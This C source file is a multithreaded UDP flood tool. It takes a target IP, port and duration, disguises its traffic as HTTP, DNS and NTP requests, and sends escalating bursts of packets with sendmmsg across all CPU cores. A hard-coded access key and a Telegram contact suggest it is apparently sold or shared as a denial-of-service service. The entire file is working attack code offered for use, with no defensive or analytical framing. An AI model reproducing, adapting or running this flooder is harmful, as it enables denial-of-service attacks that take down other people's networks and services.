#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sched.h>
#include <time.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/udp.h>

#define MAX_PACKET_SIZE 1472
#define MAX_THREADS 256
#define MAX_BURST 1024
#define MAX_PAYLOADS 10000
#define MIN_PORT 1024
#define MAX_PORT 65535

typedef struct {
    char ip_target[64];
    int port;
    int duration;
    int packet_size;
    int threads;
    int burst_size;
} config_t;

typedef struct {
    config_t *cfg;
    int thread_id;
} thread_arg_t;

char payloads[MAX_PAYLOADS][MAX_PACKET_SIZE];
int payload_lens[MAX_PAYLOADS];
int total_payloads = 0;

unsigned short checksum(unsigned short *buf, int len) {
    unsigned long sum = 0;
    while (len > 1) {
        sum += *buf++;
        len -= 2;
    }
    if (len) sum += *(unsigned char*)buf;
    while (sum >> 16) sum = (sum & 0xffff) + (sum >> 16);
    return (unsigned short)~sum;
}

void add_payload(const unsigned char *data, int len, int flag) {
    if (total_payloads >= MAX_PAYLOADS || len > MAX_PACKET_SIZE - sizeof(struct udphdr)) return;
    struct udphdr *udp_header = (struct udphdr *)payloads[total_payloads];
    unsigned char *payload_data = (unsigned char *)(payloads[total_payloads] + sizeof(struct udphdr));

    udp_header->source = htons(MIN_PORT + (rand() % (MAX_PORT - MIN_PORT + 1)));
    udp_header->dest = 0;
    udp_header->len = 0;
    udp_header->check = 0;

    memcpy(payload_data, data, len);
    payload_data[0] = (flag & 0xFF);
    payload_lens[total_payloads] = len + sizeof(struct udphdr);
    total_payloads++;
}

void generate_payloads() {
    srand(time(NULL));

    const unsigned char http_get1[] = "GET /index.html HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
    add_payload(http_get1, sizeof(http_get1) - 1, 0x01);

    const unsigned char http_get2[] = "GET /about.html HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
    add_payload(http_get2, sizeof(http_get2) - 1, 0x01);

    const unsigned char dns_query[] = "\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01";
    add_payload(dns_query, sizeof(dns_query) - 1, 0x01);

    const unsigned char ntp_request[] = "\x1b\x00\x00\x00\x00\x00\x00\x00";
    add_payload(ntp_request, sizeof(ntp_request), 0x01);

    const unsigned char test_response[] = "RESPONSE OK";
    add_payload(test_response, sizeof(test_response) - 1, 0x02);

    for (int i = 0; i < 20; i++) {
        unsigned char buffer[MAX_PACKET_SIZE - sizeof(struct udphdr)];
        int len = (i % 3 == 0) ? 1428 : (i % 3 == 1) ? 1420 : 751;
        for (int j = 0; j < len - sizeof(struct udphdr); j++) {
            if (j < 10) buffer[j] = 'A' + (rand() % 26);
            else buffer[j] = 32 + rand() % 95;
        }
        add_payload(buffer, len - sizeof(struct udphdr), (i % 2 == 0) ? 0x01 : 0x02);
    }
}

void bind_core(int core_id) {
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(core_id % sysconf(_SC_NPROCESSORS_ONLN), &cpuset);
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
}

void* flood_thread(void *arg) {
    thread_arg_t *thread = (thread_arg_t *)arg;
    config_t *cfg = thread->cfg;

    bind_core(thread->thread_id);

    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return NULL;

    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(cfg->port);
    inet_pton(AF_INET, cfg->ip_target, &target.sin_addr);

    char sendbuf[MAX_BURST][MAX_PACKET_SIZE];
    struct iovec iov[MAX_BURST];
    struct mmsghdr msgs[MAX_BURST];
    struct udphdr *udp_header;

    time_t start_time = time(NULL);
    time_t end_time = start_time + cfg->duration;

    while (time(NULL) < end_time) {
        time_t elapsed = time(NULL) - start_time;
        int current_burst = cfg->burst_size + (elapsed * cfg->burst_size / 10); // Tăng tốc độ tuyến tính
        if (current_burst > MAX_BURST) current_burst = MAX_BURST;

        for (int i = 0; i < current_burst; i++) {
            int idx = rand() % total_payloads;
            int len = payload_lens[idx];
            if (len > cfg->packet_size) len = cfg->packet_size;

            memcpy(sendbuf[i], payloads[idx], len);

            udp_header = (struct udphdr *)sendbuf[i];
            udp_header->dest = htons(cfg->port);
            udp_header->len = htons(len);
            udp_header->check = checksum((unsigned short *)sendbuf[i], len);

            iov[i].iov_base = sendbuf[i];
            iov[i].iov_len = len;

            msgs[i].msg_hdr.msg_name = &target;
            msgs[i].msg_hdr.msg_namelen = sizeof(target);
            msgs[i].msg_hdr.msg_iov = &iov[i];
            msgs[i].msg_hdr.msg_iovlen = 1;
            msgs[i].msg_hdr.msg_control = NULL;
            msgs[i].msg_hdr.msg_controllen = 0;
            msgs[i].msg_hdr.msg_flags = 0;
        }

        sendmmsg(sock, msgs, current_burst, 0);
    }

    close(sock);
    return NULL;
}

void get_local_ip(char *ip) {
    struct sockaddr_in serv;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        strcpy(ip, "127.0.0.1");
        return;
    }
    serv.sin_family = AF_INET;
    serv.sin_addr.s_addr = inet_addr("8.8.8.8");
    serv.sin_port = htons(53);
    connect(sock, (const struct sockaddr *)&serv, sizeof(serv));
    struct sockaddr_in name;
    socklen_t namelen = sizeof(name);
    getsockname(sock, (struct sockaddr *)&name, &namelen);
    strcpy(ip, inet_ntoa(name.sin_addr));
    close(sock);
}

int main(int argc, char *argv[]) {
    if (argc < 5) {
        printf("Usage: %s <ip> <port> <duration> <key> [packet_size=1472] [burst=512]\n", argv[0]);
        return 1;
    }

    // Validate key
    const char *expected_key = "69621dd1f774f908037fbf2a065dc6f1";
    if (strcmp(argv[4], expected_key) != 0) {
        printf("Wrong key please contact telegram : @chuongsex\n");
        return 1;
    }

    config_t cfg;
    memset(&cfg, 0, sizeof(cfg));
    strncpy(cfg.ip_target, argv[1], sizeof(cfg.ip_target)-1);
    cfg.port = atoi(argv[2]);
    cfg.duration = atoi(argv[3]);
    cfg.packet_size = (argc >= 6) ? atoi(argv[5]) : MAX_PACKET_SIZE;
    cfg.burst_size = (argc >= 7) ? atoi(argv[6]) : 512;

    if (cfg.packet_size > MAX_PACKET_SIZE) cfg.packet_size = MAX_PACKET_SIZE;
    if (cfg.burst_size > MAX_BURST) cfg.burst_size = MAX_BURST;

    cfg.threads = sysconf(_SC_NPROCESSORS_ONLN);
    if (cfg.threads > MAX_THREADS) cfg.threads = MAX_THREADS;

    char local_ip[64];
    get_local_ip(local_ip);
    printf("Local IP: %s\n", local_ip);
    printf("Flooding %s:%d with simulated legitimate UDP payloads\n", cfg.ip_target, cfg.port);
    printf("Duration: %d sec | Threads: %d | Packet: %d | Burst: %d\n",
        cfg.duration, cfg.threads, cfg.packet_size, cfg.burst_size);

    printf("Preparing payloads...\n");
    generate_payloads();

    pthread_t tid[MAX_THREADS];
    thread_arg_t args[MAX_THREADS];

    for (int i = 0; i < cfg.threads; i++) {
        args[i].cfg = &cfg;
        args[i].thread_id = i;
        pthread_create(&tid[i], NULL, flood_thread, &args[i]);
    }

    for (int i = 0; i < cfg.threads; i++) {
        pthread_join(tid[i], NULL);
    }

    printf("Flood complete.\n");
    return 0;
}